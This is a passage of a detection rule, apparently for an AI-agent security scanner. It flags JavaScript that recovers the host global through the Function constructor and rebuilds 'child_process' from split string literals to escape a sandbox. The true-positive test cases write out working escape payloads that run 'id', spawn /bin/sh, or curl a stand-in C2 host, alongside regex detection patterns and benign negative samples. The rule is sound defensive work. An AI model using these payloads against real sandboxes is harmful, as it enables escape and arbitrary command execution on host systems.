      strength: secondary

tags:
  category: privilege-escalation
  subcategory: sandbox-escape
  scan_target: both
  confidence: high

agent_source:
  type: mcp_exchange
  framework:
    - any
  provider:
    - any

detection:
  conditions:
    - field: content
      operator: regex
      value: '\bFunction\s*\(\s*["''\x60]\s*return\s+(?:this|globalThis|global|process)\s*["''\x60]\s*\)'
      description: "Host global recovered through the Function constructor -- Function(\"return this\"), globalThis, global or process, closed and called"
    - field: content
      operator: regex
      value: '["''](?:c["'']\s*\+\s*["'']h(?:["'']\s*\+\s*["''])?i(?:["'']\s*\+\s*["''])?l(?:["'']\s*\+\s*["''])?d(?:["'']\s*\+\s*["''])?_(?:["'']\s*\+\s*["''])?p(?:["'']\s*\+\s*["''])?r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|ch["'']\s*\+\s*["'']i(?:["'']\s*\+\s*["''])?l(?:["'']\s*\+\s*["''])?d(?:["'']\s*\+\s*["''])?_(?:["'']\s*\+\s*["''])?p(?:["'']\s*\+\s*["''])?r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|chi["'']\s*\+\s*["'']l(?:["'']\s*\+\s*["''])?d(?:["'']\s*\+\s*["''])?_(?:["'']\s*\+\s*["''])?p(?:["'']\s*\+\s*["''])?r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|chil["'']\s*\+\s*["'']d(?:["'']\s*\+\s*["''])?_(?:["'']\s*\+\s*["''])?p(?:["'']\s*\+\s*["''])?r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child["'']\s*\+\s*["'']_(?:["'']\s*\+\s*["''])?p(?:["'']\s*\+\s*["''])?r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child_["'']\s*\+\s*["'']p(?:["'']\s*\+\s*["''])?r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child_p["'']\s*\+\s*["'']r(?:["'']\s*\+\s*["''])?o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child_pr["'']\s*\+\s*["'']o(?:["'']\s*\+\s*["''])?c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child_pro["'']\s*\+\s*["'']c(?:["'']\s*\+\s*["''])?e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child_proc["'']\s*\+\s*["'']e(?:["'']\s*\+\s*["''])?s(?:["'']\s*\+\s*["''])?s|child_proce["'']\s*\+\s*["'']s(?:["'']\s*\+\s*["''])?s|child_proces["'']\s*\+\s*["'']s)["'']'
      description: "Concatenated string literals that spell child_process at any split point, including multi-way splits -- the unsplit word is excluded on purpose"
  condition: all
  false_positives:
    - "A security advisory, CTF write-up or regression test that reproduces the complete proof of concept verbatim -- measured, and unavoidable at the pattern layer"
    - "A dual-target library, or a how-to teaching one, that shims globalThis through the Function constructor and splits child_process across literals to stop a bundler statically resolving it -- the one benign construction that is byte-identical to the attack, measured firing on a webpack workaround README"
    - "A sandbox regression test that asserts the escape is refused, because asserting it requires writing it -- measured; a regression test that only exercises the first step stays silent and is a true negative below"
    - "Any ATR rule file for this family, this one included: test_cases must carry the payload verbatim. The prose in this rule deliberately does not, so the description alone is silent"

response:
  actions:
    - alert
    - snapshot
    - escalate
  auto_response_threshold: critical
  message_template: >
    [ATR-2026-02604] JavaScript submitted for execution recovers the host global
    via the Function constructor and rebuilds the child_process module name from
    concatenated string fragments -- an explicit blocklist evasion, since the
    whole word never appears. Treat the sandbox as escaped and the runtime as
    reachable.

confidence: 80
test_cases:
  true_positives:
    - input: "const g = Function('return this')(); const r = g['req'+'uire']; const cp = r('child_pro'+'cess'); cp.execSync('id');"
      expected: triggered
      description: "GHSA-p69m-4f92-2v84 shape: global recovered, require and child_process split across literals"
    - input: "const root = Function('return this')();\nconst q = root['req'+'uire'];\nq('child_'+'process').spawnSync('/bin/sh', ['-c','id']);"
      expected: triggered
      description: "Same escape with a different split point and spawnSync"
    - input: "const G = Function(\"return globalThis\")();\nconst rq = G[\"requ\"+\"ire\"];\nrq(\"child\"+\"_process\").exec(\"curl https://c2.example\");"
      expected: triggered
      description: "globalThis variant, double-quoted fragments"
    - input: "let p = Function('return process')();\nlet m = p.mainModule['requir'+'e'];\nm('child_'+'process');"
      expected: triggered
      description: "Global recovered as process, require split at the last character"
  true_negatives:
    - input: "var global = typeof globalThis == 'object' && globalThis !== null ? globalThis : Function('return this')();\nmodule.exports = global;"
      expected: not_triggered
      description: "The core-js globalThis shim -- condition 1 only"
    - input: "(function (root, factory) {\n  var g = (function(){ return this; })() || Function('return this')();\n  g.MyLib = factory();\n})(this, function () { return {}; });"
      expected: not_triggered
      description: "UMD header recovering the global"
    - input: "var t=e[\"a\"+\"b\"];var n=Function(\"return this\")();n.__lib=t;"
      expected: not_triggered
      description: "Minified bundle with both a concatenated index and the global shim, but no dangerous fragment"
    - input: "const req = module['req'+'uire'] || require;\nconst path = req('path');"
      expected: not_triggered
      description: "Real bundler-dodging trick: require split across literals, with no Function constructor"
    - input: "const nodeRequire = typeof __webpack_require__ === 'function' ? eval('require') : require;\nconst fs = nodeRequire('fs');"
      expected: not_triggered
      description: "Bundler dodge through eval instead of concatenation"
    - input: "const { execFile } = require('child_process');\nexecFile('git', ['status'], (e, out) => console.log(out));"
      expected: not_triggered
      description: "Ordinary child_process use"
    - input: "const key = 'user' + 'Id';\nconst v = row[key];\nconst other = row['created' + 'At'];"
      expected: not_triggered
      description: "Concatenated object keys in application code"
    - input: "const label = messages[prefix + 'Title'];\nconst hint = messages['form' + 'Hint'];\nconst g = Function('return this')();"
      expected: not_triggered
      description: "Concatenated i18n keys alongside a global shim"
    - input: "The Function constructor compiles its argument in global scope, so Function('return this')() reliably yields the global object even inside a module."
      expected: not_triggered
      description: "Language documentation"
    - input: "The escape works by obtaining the host Function constructor and then calling it with 'return this'; from the host global the attacker reaches require and child_process."
      expected: not_triggered
      description: "Advisory prose describing this very attack without reproducing it"
    - input: "it('blocks the Function constructor', () => {\n  expect(() => vm.run(\"Function('return this')()\")).toThrow();\n});"
      expected: not_triggered
      description: "A regression test asserting the sandbox blocks the first step"
    - input: "/*! @acme/tree-view v3.4.1 | MIT | generated by rollup, do not edit */\nvar __g = check(typeof globalThis == 'object' && globalThis) || check(typeof window == 'object' && window) || (function () { return this; })() || Function('return this')();\nfunction keyFor(node, i) { return 'child_' + node.id + '_' + i; }\nfunction renderRow(t, node) {\n  var set = t['data' + 'Set'];\n  return { key: keyFor(node, node.index), depth: set.depth, label: node.label };\n}\nexport { renderRow, keyFor };"
      expected: not_triggered
      description: "UI tree keys use a 'child_' prefix; the globalThis shim is core-js; the concat index is rollup output -- fired rule_version 1, measured silent at rule_version 2"
    - input: "!function(e,t){\"object\"==typeof exports?t(exports):t(e.Metrics={})}(this,function(e){var n=function(){return this}()||Function(\"return this\")();function r(e,t){var o=e[\"_process\"];return\"function\"==typeof o?o.call(e,t):t}e.track=function(e,t){var o=n.navigator&&n.navigator.userAgent;return r(this,{n:e,p:t,ua:o,k:t[\"ev\"+\"ent\"]})}});"
      expected: not_triggered
      description: "a private _process method reached by string index inside an ordinary minified UMD analytics bundle -- fired rule_version 1, measured silent at rule_version 2"
    - input: "(function (root, factory) {\n  var g = (function () { return this; })() || Function('return this')();\n  g.Conjugueur = factory();\n})(this, function () {\n  var TERMINAISONS = { 'uire': ['uis', 'uis', 'uit', 'uisons'], 'oire': ['ois', 'ois', 'oit'] };\n  function conjuguer(verbe) { return TERMINAISONS[verbe.slice(-4)] || []; }\n  // « construire » se conjugue comme « produire »\n  var exemple = conjuguer('constr' + 'uire');\n  return { conjuguer: conjuguer, exemple: exemple };\n});"
      expected: not_triggered
      description: "French verb endings table: 'uire' is a real French suffix, not a piece of require -- fired rule_version 1, measured silent at rule_version 2"
    - input: "// test/fixtures/constant-folding/strings.js\n// Expected: the folder must collapse adjacent string literals.\nconsole.log('pro' + 'cess');\nconsole.log('re' + 'quire');\nconsole.log('spawn' + 'Sync');\n// but must NOT fold across a global lookup\nvar g = Function('return this')();\nconsole.log(g.String('a' + 'b'));"
      expected: not_triggered
      description: "constant-folding fixture for a minifier: adjacent string literals are the point of the test -- fired rule_version 1, measured silent at rule_version 2"
    - input: "// src/policy/denylist.js -- what the interpreter refuses to hand back\nconst DENIED_MODULES = new Set(['child_process', 'fs', 'net', 'vm']);\nconst DENIED_PREFIXES = ['child_', 'node:'];\nfunction isDenied(spec) {\n  if (DENIED_MODULES.has(spec)) return true;\n  return DENIED_PREFIXES.some((p) => spec.startsWith(p));\n}\n// The host global must never leak into the guest realm.\nconst hostGlobal = Function('return this')();\nfunction freezeRealm(realm) { realm['own' + 'Keys'] = null; return Object.freeze(realm); }\nmodule.exports = { isDenied, hostGlobal, freezeRealm };"
      expected: not_triggered
      description: "the defensive source of a sandbox: a deny-list with a 'child_' prefix plus a host-global handle -- fired rule_version 1, measured silent at rule_version 2"
    - input: "import { describe, it, expect } from 'vitest';\nimport { globalObject } from '../src/global.js';\n\ndescribe('globalObject', () => {\n  it('falls back to the Function constructor under a stale runtime', () => {\n    expect(globalObject()).toBe(Function('return this')());\n  });\n});\n\ndescribe('concat', () => {\n  it('folds adjacent literals', () => {\n    expect('re' + 'quire').toBe('require');\n    expect('pro' + 'cess').toBe('process');\n  });\n});"
      expected: not_triggered
      description: "a plain unit test: one case covers the globalThis fallback, another covers string concatenation -- fired rule_version 1, measured silent at rule_version 2"
    - input: "const HOST = typeof globalThis !== 'undefined' ? globalThis : Function('return this')();\n\nclass Batcher {\n  constructor(opts) { this.opts = opts; }\n  _process(chunk) { return this.opts.map(chunk); }\n  run(chunk) {\n    const hook = this['_process'];\n    return hook.call(this, chunk);\n  }\n  static from(o) { return new Batcher(o['def' + 'aults']); }\n}\n\nmodule.exports = { Batcher, HOST };"
      expected: not_triggered
      description: "an ordinary _process hook reached by string index, with a browser-safe global lookup -- fired rule_version 1, measured silent at rule_version 2"
    - input: "/* eslint-disable */\n/* THIS FILE IS GENERATED BY graphql-codegen. DO NOT EDIT. */\nvar __globalScope = (function () { return this; })() || Function('return this')();\nexport const resolvers = {\n  Node: {\n    __resolveType(obj) { return obj['__type' + 'name']; },\n    children: (parent, _args, ctx) => ctx.loaders['child_' + parent.kind].loadMany(parent.childIds),\n  },\n};"
      expected: not_triggered
      description: "generated resolver file: a per-kind loader table keyed 'child_' + kind -- fired rule_version 1, measured silent at rule_version 2"
    - input: "const { contextBridge } = require('electron');\nconst hostGlobal = typeof globalThis === 'object' ? globalThis : Function('return this')();\nconst CHILD_WINDOW_PREFIX = 'child_';\nfunction nameFor(kind, n) { return CHILD_WINDOW_PREFIX + kind + '_' + n; }\ncontextBridge.exposeInMainWorld('app', {\n  openChild: (kind, n) => hostGlobal.open('', nameFor(kind, n)),\n  version: hostGlobal.process ? hostGlobal.process.versions['ele' + 'ctron'] : null,\n});"
      expected: not_triggered
      description: "Electron preload naming child BrowserWindows with a 'child_' prefix -- fired rule_version 1, measured silent at rule_version 2"
    - input: "// Jest Snapshot v1, https://goo.gl/fbAQLP\n\nexports[`bundler emits the global shim 1`] = `\n\"var g = Function('return this')();\nexport default g;\"\n`;\n\nexports[`bundler folds concatenated keys 1`] = `\n\"export default o['fo' + 'oId'];\nexport const suffix = 'quire';\"\n`;"
      expected: not_triggered
      description: "a generated Jest snapshot of a bundler's own output -- fired rule_version 1, measured silent at rule_version 2"
    - input: "/******/ (() => {\n/******/ \t__webpack_require__.g = (function() {\n/******/ \t\tif (typeof globalThis === 'object') return globalThis;\n/******/ \t\ttry { return this || new Function('return this')(); } catch (e) { if (typeof window === 'object') return window; }\n/******/ \t})();\n/******/ \tvar shim = __webpack_require__.g['pro' + 'cess'] || { env: {} };\n/******/ \tshim.nextTick = shim.nextTick || function (f) { setTimeout(f, 0); };\n/******/ })();"
      expected: not_triggered
      description: "the real webpack runtime global shim plus a browser process shim looked up by a folded key -- fired rule_version 1, measured silent at rule_version 2"
    - input: "// src/signatures/js-sandbox-escape.js -- detector, not payload\nmodule.exports = [\n  { id: 'JS-ESC-01', re: /Function\\s*\\(\\s*['\\\"]return this['\\\"]\\s*\\)/ },\n  { id: 'JS-ESC-02', re: /['\\\"]child_['\\\"]\\s*\\+\\s*['\\\"]process['\\\"]/ },\n  { id: 'JS-ESC-03', re: /constructor\\s*\\.\\s*constructor/ },\n];"
      expected: not_triggered
      description: "a detector's own signature list: the patterns are regex source, not concatenations -- measured silent"
    - input: "### 沙箱逃逸:名稱切割繞過黑名單\n\n講解重點:攻擊者先用 Function 建構子取回宿主 global,再把模組名稱切成兩段字串相加,\n讓只做整字比對的黑名單掃不到。防禦上不要用字串比對,要在 realm 邊界上禁止 require 本身。\n本教材不附完整 PoC,實驗請在課堂沙箱環境操作。"
      expected: not_triggered
      description: "Traditional Chinese course notes that explain the technique without reproducing it -- measured silent"
    - input: "const strings = { 'child_process_label': 'Child process', 'child_' : 'Child' };\nconst g = Function('return this')();\nexport const t = (k) => strings[k] ?? g.String(k);"
      expected: not_triggered
      description: "an i18n table with a child_process_label key and a globalThis shim -- no concatenation -- measured silent"
    - input: "// Docs: why we never build module names dynamically.\n// Bad:  require(name)              <- unresolvable\n// Bad:  require('child' + suffix)  <- unresolvable\n// Good: require('child_process')\nconst g = Function('return this')();\nmodule.exports = { g };"
      expected: not_triggered
      description: "a coding-standards comment about dynamic module names, with a variable not a literal -- measured silent"
